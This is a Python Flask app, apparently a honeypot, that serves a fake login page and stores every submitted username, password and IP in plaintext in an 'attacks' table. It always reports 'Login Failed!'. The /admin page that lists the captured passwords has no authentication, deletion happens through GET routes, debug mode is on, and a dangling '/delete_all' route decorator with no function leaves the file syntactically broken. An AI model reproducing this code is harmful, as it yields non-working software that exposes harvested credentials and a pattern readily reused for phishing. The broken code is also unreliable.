from flask import Flask, render_template, request, redirect
import sqlite3
from datetime import datetime

app = Flask(__name__)

# Create Database
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS attacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    username TEXT,
                    password TEXT,
                    time TEXT
                )''')
    conn.commit()
    conn.close()

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture():
    ip = request.remote_addr
    username = request.form['username']
    password = request.form['password']
    time = datetime.now()

    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO attacks (ip, username, password, time) VALUES (?, ?, ?, ?)",
              (ip, username, password, time))
    conn.commit()
    conn.close()

    return "Login Failed!"

@app.route('/admin')
def admin():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM attacks")
    data = c.fetchall()
    conn.close()
    return render_template('admin.html', data=data)
 
@app.route('/delete/<int:id>')
def delete_attack(id):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("DELETE FROM attacks WHERE id=?", (id,))
    conn.commit()
    conn.close()
    return redirect('/admin')

@app.route('/delete_all')

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
